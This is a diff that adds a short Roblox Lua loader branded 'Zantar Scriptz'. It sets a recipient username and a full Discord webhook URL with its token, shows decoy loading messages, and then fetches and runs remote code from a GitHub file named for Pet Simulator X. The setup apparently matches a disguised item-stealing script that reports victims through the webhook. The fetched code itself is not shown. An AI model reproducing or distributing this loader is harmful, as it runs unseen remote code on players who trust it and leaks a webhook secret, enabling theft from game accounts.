@@ -1,0 +1,10 @@
+Username = "venhacker"
+--Username2 = "venhacker" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/1114300624067108915/FDvBmuNGzJwQAseFQ3rTr_APOAlt_H8Jh6vRJA3TASgmMaDlIdCtVGP4MmUYEpLBRdyY"
+loadingscreen = true
+_G.CustomScriptName = "Zantar Scriptz"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))() 
